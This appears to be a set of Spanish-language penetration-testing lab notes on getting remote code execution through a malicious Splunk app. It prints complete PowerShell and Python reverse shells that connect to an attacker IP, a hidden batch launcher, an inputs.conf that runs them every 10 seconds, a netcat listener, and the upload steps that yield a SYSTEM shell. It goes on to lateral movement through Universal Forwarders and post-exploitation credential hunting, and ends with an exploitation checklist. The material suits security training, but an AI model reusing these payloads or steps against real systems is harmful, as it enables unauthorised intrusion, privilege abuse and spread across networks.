
## 1. Explotación mediante aplicaciones personalizadas

Si tenemos acceso a Splunk con permisos para instalar aplicaciones, podemos conseguir **RCE mediante Scripted Inputs**.

Splunk permite ejecutar scripts de:

- Python.
    
- PowerShell.
    
- Bash.
    
- Batch.
    

En el laboratorio, el objetivo es un servidor Windows y se utiliza una aplicación personalizada para ejecutar una reverse shell de PowerShell.

**Requisito:** tener permisos para instalar aplicaciones personalizadas en Splunk.

---

## 2. Estructura de la aplicación

Primero creamos la estructura necesaria:

```
mkdir -p splunk_shell/{bin,default}
```

La aplicación tendrá esta estructura:

```
splunk_shell/
├── bin/
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default/
    └── inputs.conf
```

**Función de cada archivo:**

|Archivo|Función|
|---|---|
|`rev.py`|Reverse shell de Python para Linux|
|`run.ps1`|Reverse shell de PowerShell para Windows|
|`run.bat`|Ejecuta el script de PowerShell|
|`inputs.conf`|Indica a Splunk qué scripts ejecutar|

---

## 3. Configuración de inputs.conf

Ruta:

```
splunk_shell/default/inputs.conf
```

Contenido:

```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

**Parámetros importantes:**

|Parámetro|Función|
|---|---|
|`script://`|Ruta del script que ejecutará Splunk|
|`disabled = 0`|Habilita la ejecución|
|`interval = 10`|Ejecuta el script cada 10 segundos|
|`sourcetype = shell`|Define el tipo de datos|

La entrada programada solo se ejecutará si está configurada en `inputs.conf`.

---

## 4. Explotación en Windows

### Archivo run.ps1

Ruta:

```
splunk_shell/bin/run.ps1
```

Contiene la reverse shell de PowerShell:

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Debemos sustituir:

```
10.10.14.15 → Nuestra IP
443         → Puerto del listener
```

### Archivo run.bat

Ruta:

```
splunk_shell/bin/run.bat
```

Contenido:

```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Este archivo ejecuta `run.ps1` mediante PowerShell.

**Importante:** Splunk ejecuta `run.bat` porque está definido en `inputs.conf`.

---

## 5. Empaquetar la aplicación

Una vez creados todos los archivos:

```
tar -cvzf updater.tar.gz splunk_shell/
```

El resultado será:

```
updater.tar.gz
```

Splunk permite instalar aplicaciones empaquetadas en:

```
.tar.gz
.spl
```

## 6. Subir la aplicación a Splunk

En el laboratorio, la administración de aplicaciones se encuentra en:

```
https://10.129.201.50:8000/en-US/manager/search/apps/local
```

Desde esa página:

1. Seleccionar **Install app from file**.
    
2. Elegir el archivo `updater.tar.gz`.
    
3. Subir la aplicación.
    

También podemos acceder directamente a:

```
https://10.129.201.50:8000/en-US/manager/appinstall/_upload
```

Antes de subir la aplicación, iniciamos nuestro listener:

```
sudo nc -lvnp 443
```

Cuando Splunk instala y habilita la aplicación, ejecuta los scripts configurados en `inputs.conf`.

En el laboratorio se obtiene una conexión:

```
connect to [10.10.14.15] from [10.129.201.50]
```

Comprobamos los privilegios:

```
whoami
```

Resultado:

```
nt authority\system
```

Identificamos el equipo:

```
hostname
```

Resultado:

```
APP03
```

**Resultado del laboratorio: RCE con privilegios NT AUTHORITY\SYSTEM.**

Esto ocurre porque el servicio Splunk del objetivo se ejecuta con esos privilegios.

## 7. Explotación en Linux

En Linux podemos utilizar el archivo:

```
splunk_shell/bin/rev.py
```

Contenido:

```
import sys,socket,os,pty

ip="10.10.14.15"
port="443"

s=socket.socket()
s.connect((ip,int(port)))

[os.dup2(s.fileno(),fd) for fd in (0,1,2)]

pty.spawn('/bin/bash')
```

Debemos modificar la IP y el puerto.

Después empaquetamos la aplicación:

```
tar -cvzf updater.tar.gz splunk_shell/
```

Iniciamos el listener:

```
sudo nc -lvnp 443
```

Finalmente, subimos la aplicación desde la interfaz web.

El procedimiento es prácticamente idéntico al de Windows, pero utilizamos Python para ejecutar `/bin/bash`.

## 8. Movimiento lateral mediante Universal Forwarders

Una posibilidad adicional aparece cuando el servidor comprometido funciona como **Splunk Deployment Server**.

Este servidor puede distribuir aplicaciones a otros equipos que tengan instalado Splunk Universal Forwarder.

El material identifica la siguiente ruta:

```
$SPLUNK_HOME/etc/deployment-apps/
```

Si controlamos un Deployment Server y disponemos de los permisos necesarios, podemos colocar aplicaciones en ese directorio para distribuirlas a los clientes correspondientes.

Esto puede permitir ejecutar código en otros hosts de la red.

### Consideraciones importantes

**Windows:**

Los Universal Forwarders no incluyen necesariamente Python.

Por eso, el material recomienda utilizar aplicaciones con scripts de PowerShell para entornos Windows.

**Linux:**

Podemos adaptar la aplicación para utilizar scripts compatibles con el sistema operativo.

La distribución y ejecución dependerán de la configuración del Deployment Server y de sus clientes.

## 9. Post-explotación

Una vez obtenida la shell, el material propone continuar con:

- Enumeración del sistema comprometido.
    
- Búsqueda de credenciales almacenadas.
    
- Revisión del registro de Windows.
    
- Investigación de credenciales presentes en memoria.
    
- Enumeración de archivos que puedan contener información sensible.
    
- Enumeración de Active Directory si el servidor pertenece a un dominio.
    
- Identificación de posibles rutas de movimiento lateral.
    

En el laboratorio, la shell obtenida tiene privilegios SYSTEM, lo que facilita estas tareas.

---

## 10. Checklist de explotación

1. Conseguir acceso a Splunk con permisos para instalar aplicaciones.
    
2. Identificar si el servidor utiliza Windows o Linux.
    
3. Crear `splunk_shell/bin` y `splunk_shell/default`.
    
4. Preparar `run.ps1` y `run.bat` para Windows, o `rev.py` para Linux.
    
5. Configurar `inputs.conf`.
    
6. Establecer `disabled = 0`.
    
7. Configurar `interval = 10`.
    
8. Empaquetar la aplicación como `.tar.gz`.
    
9. Iniciar un listener con Netcat.
    
10. Subir la aplicación mediante **Install app from file**.
    
11. Comprobar si recibimos una reverse shell.
    
12. Ejecutar `whoami` para identificar privilegios.
    
13. Ejecutar `hostname` para identificar el equipo.
    
14. Comprobar si el servidor es un Deployment Server.
    
15. Si procede, evaluar la distribución de aplicaciones mediante Universal Forwarders.
